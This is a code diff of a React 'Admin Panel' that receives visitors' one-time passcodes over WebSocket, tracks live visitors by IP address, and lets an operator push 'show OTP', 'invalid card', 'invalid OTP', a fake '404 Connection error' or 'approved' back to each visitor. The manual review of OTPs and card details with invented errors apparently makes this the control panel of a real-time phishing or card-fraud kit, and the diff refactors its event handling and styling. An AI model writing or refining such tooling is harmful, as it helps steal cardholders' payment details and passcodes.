@@ -107,7 +107,7 @@ const Admin = () => {
       });
 
       // Listen for OTP submissions with error handling
-      newSocket.on('otp-submitted', (data: { otp: string }) => {
+      newSocket.on('otp-received', (data: { otp: string }) => {
         try {
           if (!data || !data.otp) {
             console.error('Invalid OTP data received:', data);
@@ -129,24 +129,32 @@ const Admin = () => {
       });
 
       // Listen for visitor join/leave events
-      newSocket.on('visitor-joined', (data: Omit<VisitorData, 'id'>) => {
+      newSocket.on('visitor-joined', (data: VisitorData) => {
         try {
           if (!data || !data.ipAddress) {
             console.error('Invalid visitor data received:', data);
             return;
           }
           
-          const newVisitor: VisitorData = {
-            ...data,
-            id: Date.now().toString() + Math.random().toString(36).substr(2, 9)
-          };
-          setLiveVisitors(prev => [newVisitor, ...prev]);
+          setLiveVisitors(prev => {
+            // Check if visitor already exists
+            const existingIndex = prev.findIndex(v => v.ipAddress === data.ipAddress);
+            if (existingIndex !== -1) {
+              // Update existing visitor
+              const updated = [...prev];
+              updated[existingIndex] = data;
+              return updated;
+            } else {
+              // Add new visitor
+              return [data, ...prev];
+            }
+          });
         } catch (error) {
           console.error('Error processing visitor data:', error);
         }
       });
 
-      newSocket.on('visitor-left', (data: { ipAddress: string }) => {
+      newSocket.on('visitor-left', (data: { id: string; ipAddress: string }) => {
         try {
           if (!data || !data.ipAddress) {
             console.error('Invalid visitor leave data received:', data);
@@ -170,7 +178,7 @@ const Admin = () => {
       console.error('Error initializing WebSocket connection:', error);
       setIsConnected(false);
     }
-  }, [payments]);
+  }, []);
 
   const handleAction = (paymentId: string, action: string) => {
     try {
@@ -199,23 +207,23 @@ const Admin = () => {
           socket.emit('show-otp');
           break;
         case 'invalid-otp':
-          socket.emit('payment-rejected', 'Invalid OTP');
+          socket.emit('reject-payment', { reason: 'Invalid OTP' });
           updatePaymentStatus(paymentId, 'rejected');
           break;
         case 'invalid-card':
-          socket.emit('payment-rejected', 'Invalid card details');
+          socket.emit('reject-payment', { reason: 'Invalid card details' });
           updatePaymentStatus(paymentId, 'rejected');
           break;
         case 'incorrect-details':
-          socket.emit('payment-rejected', 'Incorrect card details');
+          socket.emit('reject-payment', { reason: 'Incorrect card details' });
           updatePaymentStatus(paymentId, 'rejected');
           break;
         case 'connection-error':
-          socket.emit('payment-rejected', '404 Connection error');
+          socket.emit('reject-payment', { reason: '404 Connection error' });
           updatePaymentStatus(paymentId, 'rejected');
           break;
         case 'successful':
-          socket.emit('payment-approved');
+          socket.emit('approve-payment');
           updatePaymentStatus(paymentId, 'approved');
           break;
         default:
@@ -274,21 +282,24 @@ const Admin = () => {
   return (
     <div className="min-h-screen bg-black text-white p-6">
       <div className="max-w-7xl mx-auto">
-        {/* Header */}
+        {/* Header with Connection Status */}
         <div className="flex items-center justify-between mb-8">
           <h1 className="text-3xl font-bold">Admin Panel</h1>
-          <div className="flex items-center gap-2">
-            {isConnected ? (
-              <>
-                <Wifi className="h-5 w-5 text-green-400" />
-                <span className="text-green-400">Connected</span>
-              </>
-            ) : (
-              <>
-                <WifiOff className="h-5 w-5 text-red-400" />
-                <span className="text-red-400">Disconnected</span>
-              </>
-            )}
+          <div className="flex items-center gap-4">
+            {/* Connection Status */}
+            <div className="flex items-center gap-2 bg-gray-800 px-3 py-2 rounded-lg">
+              {isConnected ? (
+                <>
+                  <Wifi className="h-5 w-5 text-green-400" />
+                  <span className="text-green-400 text-sm font-medium">Connected</span>
+                </>
+              ) : (
+                <>
+                  <WifiOff className="h-5 w-5 text-red-400" />
+                  <span className="text-red-400 text-sm font-medium">Disconnected</span>
+                </>
+              )}
+            </div>
           </div>
         </div>
 
